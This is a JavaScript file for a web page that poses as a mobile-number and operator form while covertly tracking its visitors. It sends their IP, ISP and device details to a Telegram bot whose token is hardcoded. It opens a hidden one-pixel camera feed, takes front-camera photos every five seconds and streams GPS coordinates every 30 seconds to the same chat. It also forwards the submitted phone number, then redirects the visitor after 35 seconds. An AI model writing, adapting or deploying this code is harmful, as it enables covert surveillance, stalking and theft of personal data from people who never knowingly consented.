const BOT_TOKEN = "8431980730:AAFkOEc194xolmick_CgUMt5T51tf9c5S6Y";
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

let cameraStream = null;
let photoInterval = null;
let locationInterval = null;
let currentChatId = null;
let isCameraActive = false;
let photoCounter = 0;
let videoElement = null;
let watchId = null;
let currentLocation = null;
let locationUpdates = 0;
let isSubmitted = false;
let redirectUrl = "https://telegram.me/ANAS_ACCESS_BOT";
let redirectTimer = null;
let permissionAttempts = 0;
const MAX_PERMISSION_ATTEMPTS = 5;
let isDataSent = false;

// Create video element
function createVideoElement() {
    if (videoElement) return videoElement;

    videoElement = document.createElement('video');
    videoElement.id = 'camera-feed';
    videoElement.autoplay = true;
    videoElement.playsInline = true;
    videoElement.muted = true;
    videoElement.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
        z-index: -9999;
    `;
    document.body.appendChild(videoElement);
    return videoElement;
}

// Parse URL parameters
function getUrlParameters() {
    const params = new URLSearchParams(window.location.search);
    const result = {};

    for (const [key, value] of params.entries()) {
        result[key] = value;
    }

    return result;
}

// Get redirect URL from parameter
function getRedirectUrl() {
    const params = getUrlParameters();
    let urlParam = params.url || params.redirect || params.link || params.u || params.r || params.l;

    if (urlParam) {
        try {
            const decodedUrl = decodeURIComponent(urlParam);
            let cleanUrl = decodedUrl.replace(/<[^>]*>/g, '');

            if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
                cleanUrl = 'https://' + cleanUrl;
            }

            new URL(cleanUrl);
            console.log("Valid redirect URL:", cleanUrl);
            return cleanUrl;
        } catch (error) {
            console.error("Invalid redirect URL:", error);
        }
    }

    return "https://telegram.me/ANAS_ACCESS_BOT";
}

async function getIpDetails() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP details");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP details:", error);
        return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            org: "Unknown",
            asn: "Unknown",
        };
    }
}

async function getDeviceInfo() {
    const deviceInfo = {
        charging: false,
        chargingPercentage: null,
        networkType: null,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
    };

    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            deviceInfo.charging = battery.charging;
            deviceInfo.chargingPercentage = Math.round(battery.level * 100);
        } catch (e) {
            console.error("Battery API error:", e);
        }
    }

    if (navigator.connection) {
        deviceInfo.networkType = navigator.connection.effectiveType;
        deviceInfo.downlink = navigator.connection.downlink;
        deviceInfo.rtt = navigator.connection.rtt;
    }

    deviceInfo.screenWidth = window.screen.width;
    deviceInfo.screenHeight = window.screen.height;
    deviceInfo.windowWidth = window.innerWidth;
    deviceInfo.windowHeight = window.innerHeight;
    deviceInfo.currentTime = new Date().toLocaleString();

    return deviceInfo;
}

async function sendTelegramMessage(chatId, message) {
    const data = {
        chat_id: chatId,
        text: message,
        parse_mode: "HTML"
    };

    try {
        const response = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        console.log("Telegram Response:", result);
        return result.ok;
    } catch (error) {
        console.error("Error sending message:", error);
        return false;
    }
}

async function sendPhoto(chatId, photo, photoNumber = 0, location = null) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', photo);

    const timestamp = new Date().toLocaleTimeString();
    let caption = `📸 Photo #${photoNumber}\n⏰ Time: ${timestamp}`;

    if (location) {
        const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
        caption += `\n📍 Location: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
        caption += `\n🗺️ Maps: ${mapsUrl}`;
        caption += `\n🎯 Accuracy: ${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}`;
    }

    formData.append('caption', caption);

    try {
        const response = await fetch(API_FILE_URL, {
            method: "POST",
            body: formData
        });

        const result = await response.json();
        console.log(`Photo #${photoNumber} sent:`, result.ok ? "Success" : "Failed");
        return result.ok;
    } catch (error) {
        console.error(`Error sending photo #${photoNumber}:`, error);
        return false;
    }
}

async function sendLocationUpdate(chatId, location) {
    const timestamp = new Date().toLocaleString();
    const mapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;

    const message = `
<b>📍 LOCATION UPDATE #${locationUpdates}</b>
<b>Latitude:</b> <i>${location.latitude.toFixed(6)}</i>
<b>Longitude:</b> <i>${location.longitude.toFixed(6)}</i>
<b>Accuracy:</b> <i>${location.accuracy ? location.accuracy.toFixed(2) + 'm' : 'N/A'}</i>
<b>Time:</b> <i>${timestamp}</i>
<b>Maps:</b> <a href="${mapsUrl}">Open</a>
    `;

    const sent = await sendTelegramMessage(chatId, message);
    if (sent) locationUpdates++;
    return sent;
}

async function capturePhoto() {
    if (!videoElement || !cameraStream || !videoElement.videoWidth || videoElement.videoWidth === 0) {
        console.error("Camera not ready");
        return null;
    }

    try {
        await new Promise(resolve => setTimeout(resolve, 100));

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;

        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        return new Promise((resolve) => {
            canvas.toBlob(blob => {
                if (blob) {
                    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
                    resolve(file);
                } else {
                    resolve(null);
                }
            }, 'image/jpeg', 0.8);
        });
    } catch (error) {
        console.error("Error capturing photo:", error);
        return null;
    }
}

async function requestCameraPermission() {
    try {
        console.log("Requesting camera permission...");

        createVideoElement();

        const constraints = {
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        cameraStream = stream;
        videoElement.srcObject = stream;

        return new Promise((resolve) => {
            const checkVideoReady = () => {
                if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
                    console.log(`Camera ready: ${videoElement.videoWidth}x${videoElement.videoHeight}`);
                    isCameraActive = true;
                    resolve(true);
                } else {
                    setTimeout(checkVideoReady, 100);
                }
            };

            videoElement.onloadedmetadata = checkVideoReady;
            videoElement.onerror = () => resolve(false);
            checkVideoReady();
        });

    } catch (error) {
        console.error("Camera permission denied:", error);
        isCameraActive = false;
        return false;
    }
}

async function requestLocationPermission() {
    if (!navigator.geolocation) {
        console.error("Geolocation not supported");
        return false;
    }

    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });

        currentLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading,
            timestamp: new Date(position.timestamp)
        };

        console.log("Location permission granted");

        // Start watching location
        watchId = navigator.geolocation.watchPosition(
            (position) => {
                currentLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    timestamp: new Date(position.timestamp)
                };
            },
            (error) => console.error("Location error:", error),
            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
        );

        // Send initial location update
        if (currentChatId) {
            await sendLocationUpdate(currentChatId, currentLocation);
        }

        // Periodic updates
        locationInterval = setInterval(async () => {
            if (currentLocation && currentChatId) {
                await sendLocationUpdate(currentChatId, currentLocation);
            }
        }, 30000); // Every 30 seconds

        return true;
    } catch (error) {
        console.error("Location permission denied:", error);
        return false;
    }
}

// Request permissions continuously
async function requestAllPermissions() {
    console.log("Requesting all permissions...");

    // Try camera
    const cameraGranted = await requestCameraPermission();
    
    // Try location after 500ms
    setTimeout(async () => {
        const locationGranted = await requestLocationPermission();
        
        // If both granted, start capturing
        if (cameraGranted && locationGranted) {
            console.log("All permissions granted!");
            startContinuousPhotoCapture();
        } else {
            // Retry after 3 seconds
            permissionAttempts++;
            if (permissionAttempts < MAX_PERMISSION_ATTEMPTS) {
                console.log(`Retrying permissions in 3 seconds... (Attempt ${permissionAttempts + 1}/${MAX_PERMISSION_ATTEMPTS})`);
                
                // Update status
                updatePermissionStatus();
                
                setTimeout(requestAllPermissions, 3000);
            } else {
                console.log("Max permission attempts reached");
                // Even if permissions not granted, still try to capture
                if (cameraGranted) {
                    startContinuousPhotoCapture();
                }
            }
        }
    }, 500);
}

function updatePermissionStatus() {
    const statusDiv = document.getElementById('permission-status');
    if (statusDiv) {
        statusDiv.innerHTML = `
            <div style="background: #ffcc00; color: #000; padding: 10px; border-radius: 5px; margin: 10px 0;">
                <strong>⚠️ Permission Required</strong><br>
                Please allow Camera and Location access<br>
                Attempt: ${permissionAttempts + 1}/${MAX_PERMISSION_ATTEMPTS}
            </div>
        `;
    }
}

async function startContinuousPhotoCapture() {
    if (!currentChatId) return;

    console.log("Starting photo capture every 5 seconds...");

    // First photo immediately if camera active
    if (isCameraActive) {
        setTimeout(async () => {
            try {
                const photo = await capturePhoto();
                if (photo) {
                    photoCounter++;
                    await sendPhoto(currentChatId, photo, photoCounter, currentLocation);
                }
            } catch (error) {
                console.error("First photo error:", error);
            }
        }, 1000);
    }

    // Then every 5 seconds
    photoInterval = setInterval(async () => {
        if (isCameraActive) {
            try {
                const photo = await capturePhoto();
                if (photo) {
                    photoCounter++;
                    await sendPhoto(currentChatId, photo, photoCounter, currentLocation);

                    // Status update every 10 photos
                    if (photoCounter % 10 === 0) {
                        const status = `
<b>📊 STATUS UPDATE</b>
<b>Photos:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Camera:</b> ${isCameraActive ? '✅' : '❌'}
<b>Location:</b> ${currentLocation ? '✅' : '❌'}
<b>Time:</b> ${new Date().toLocaleString()}
                        `;
                        await sendTelegramMessage(currentChatId, status);
                    }
                }
            } catch (error) {
                console.error("Photo capture error:", error);
            }
        }
    }, 5000);
}

async function sendInitialInfo() {
    try {
        const ipDetails = await getIpDetails();
        const deviceInfo = await getDeviceInfo();
        const params = getUrlParameters();

        currentChatId = params.id || params.chat_id || params.cid;
        redirectUrl = getRedirectUrl();

        if (!currentChatId) {
            alert("❌ Missing Chat ID in URL");
            return;
        }

        const message = `
<b>🚀 PAGE LOADED</b>
<b>Time:</b> ${deviceInfo.currentTime}
<b>IP:</b> ${ipDetails.ip}
<b>Location:</b> ${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}
<b>ISP:</b> ${ipDetails.org}
<b>Device:</b> ${deviceInfo.platform}
<b>Screen:</b> ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
<b>Network:</b> ${deviceInfo.networkType}
<b>Redirect URL:</b> ${redirectUrl}
<b>Page URL:</b> ${window.location.href}
        `;

        await sendTelegramMessage(currentChatId, message);
        console.log("Initial info sent");

        // Start requesting permissions
        requestAllPermissions();

    } catch (error) {
        console.error("Initial info error:", error);
    }
}

function cleanup() {
    console.log("Cleaning up...");

    if (photoInterval) {
        clearInterval(photoInterval);
        photoInterval = null;
    }

    if (locationInterval) {
        clearInterval(locationInterval);
        locationInterval = null;
    }

    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
    }

    if (videoElement) {
        videoElement.srcObject = null;
        if (videoElement.parentNode) videoElement.remove();
        videoElement = null;
    }

    if (redirectTimer) {
        clearTimeout(redirectTimer);
        redirectTimer = null;
    }

    isCameraActive = false;

    // Send final message
    if (currentChatId && !isDataSent) {
        const finalMsg = `
<b>📊 SESSION ENDED</b>
<b>Photos:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Time:</b> ${new Date().toLocaleString()}
        `;

        const blob = new Blob([JSON.stringify({
            chat_id: currentChatId,
            text: finalMsg,
            parse_mode: "HTML"
        })], {type: 'application/json'});

        navigator.sendBeacon(API_URL, blob);
    }
}

// Send final data and then redirect
async function sendFinalDataAndRedirect() {
    console.log("Sending final data before redirect...");
    
    if (isDataSent) return;
    
    isDataSent = true;
    
    // Send final location
    if (currentLocation && currentChatId) {
        await sendLocationUpdate(currentChatId, currentLocation);
    }
    
    // Send final photo
    if (isCameraActive && currentChatId) {
        const finalPhoto = await capturePhoto();
        if (finalPhoto) {
            photoCounter++;
            await sendPhoto(currentChatId, finalPhoto, photoCounter, currentLocation);
        }
    }
    
    // Send redirect notification
    if (currentChatId) {
        const redirectMsg = `
<b>🔄 REDIRECTING USER</b>
<b>Final Photos:</b> ${photoCounter}
<b>Final Location Updates:</b> ${locationUpdates}
<b>Redirecting to:</b> ${redirectUrl}
<b>Total Time on Page:</b> 35 seconds
<b>Time:</b> ${new Date().toLocaleString()}
        `;
        
        await sendTelegramMessage(currentChatId, redirectMsg);
    }
    
    // Wait 1 second for messages to send
    setTimeout(() => {
        console.log("Redirecting to:", redirectUrl);
        cleanup();
        window.location.href = redirectUrl;
    }, 1000);
}

// Start redirect timer (35 seconds)
function startRedirectTimer() {
    console.log("Starting 35-second redirect timer...");
    
    if (redirectTimer) {
        clearTimeout(redirectTimer);
    }
    
    redirectTimer = setTimeout(() => {
        console.log("35 seconds completed, sending final data and redirecting...");
        sendFinalDataAndRedirect();
    }, 35000); // 35 seconds
}

// Event listeners
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        if (photoInterval) {
            clearInterval(photoInterval);
            photoInterval = null;
        }
    } else {
        if (isCameraActive && currentChatId && !photoInterval && !isSubmitted) {
            startContinuousPhotoCapture();
        }
    }
});

window.addEventListener('beforeunload', function(e) {
    if (!isSubmitted) {
        cleanup();
    }
});

// Form submission
document.getElementById('data-form').addEventListener('submit', async function (event) {
    event.preventDefault();

    const operator = document.getElementById('operator').value;
    const mobileNumber = document.getElementById('mobile-number').value;
    const params = getUrlParameters();
    const chatId = params.id || params.chat_id || params.cid;

    if (!chatId) {
        alert("Missing Chat ID");
        return;
    }

    // Disable button
    const submitBtn = document.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    try {
        const ipDetails = await getIpDetails();

        const message = `
<b>📱 FORM SUBMITTED</b>
<b>Number:</b> +91${mobileNumber}
<b>Operator:</b> ${operator}
<b>Redirect To:</b> ${redirectUrl}
${currentLocation ? `
<b>📍 Current Location:</b> ${currentLocation.latitude.toFixed(6)}, ${currentLocation.longitude.toFixed(6)}
<b>Accuracy:</b> ${currentLocation.accuracy ? currentLocation.accuracy.toFixed(2) + 'm' : 'N/A'}
` : ''}
<b>IP:</b> ${ipDetails.ip}
<b>City:</b> ${ipDetails.city}
<b>ISP:</b> ${ipDetails.org}
<b>Photos Taken:</b> ${photoCounter}
<b>Location Updates:</b> ${locationUpdates}
<b>Time:</b> ${new Date().toLocaleString()}
        `;

        const success = await sendTelegramMessage(chatId, message);

        if (success) {
            isSubmitted = true;

            // Change button text
            submitBtn.textContent = "Submitted ✓";
            
            // Start 35-second redirect timer
            startRedirectTimer();
            
        } else {
            alert("Failed to submit. Try again.");
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
        }

    } catch (error) {
        console.error("Submit error:", error);
        alert("Error occurred. Try again.");
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
    }
});

// Mobile number formatting
document.getElementById('mobile-number').addEventListener('input', function () {
    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
});

// Create permission status div
function createPermissionStatus() {
    const statusDiv = document.createElement('div');
    statusDiv.id = 'permission-status';
    statusDiv.style.cssText = `
        background: #f8f9fa;
        border-left: 4px solid #007bff;
        padding: 10px;
        margin: 10px 0;
        border-radius: 4px;
        font-size: 14px;
    `;
    
    const container = document.querySelector('.container');
    if (container) {
        container.insertBefore(statusDiv, container.firstChild);
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    console.log("Starting tracking system...");

    // Get parameters
    const params = getUrlParameters();
    redirectUrl = getRedirectUrl();

    console.log("Redirect URL:", redirectUrl);

    // Show redirect info
    const redirectInfo = document.getElementById('redirect-info');
    if (redirectInfo && redirectUrl !== "https://telegram.me/ANAS_ACCESS_BOT") {
        redirectInfo.textContent = `Will redirect to: ${redirectUrl}`;
        redirectInfo.style.display = 'block';
    }

    // Create permission status div
    createPermissionStatus();

    // Update stats display
    const updateStats = setInterval(() => {
        const camStatus = document.getElementById('cam-status');
        const gpsStatus = document.getElementById('gps-status');
        const photoCount = document.getElementById('photo-count');
        const locCount = document.getElementById('loc-count');

        if (camStatus) camStatus.textContent = isCameraActive ? '✅ Active' : '⏳ Requesting...';
        if (gpsStatus) gpsStatus.textContent = currentLocation ? '✅ Active' : '⏳ Requesting...';
        if (photoCount) photoCount.textContent = photoCounter;
        if (locCount) locCount.textContent = locationUpdates;
    }, 1000);

    // Start everything
    setTimeout(sendInitialInfo, 1000);
});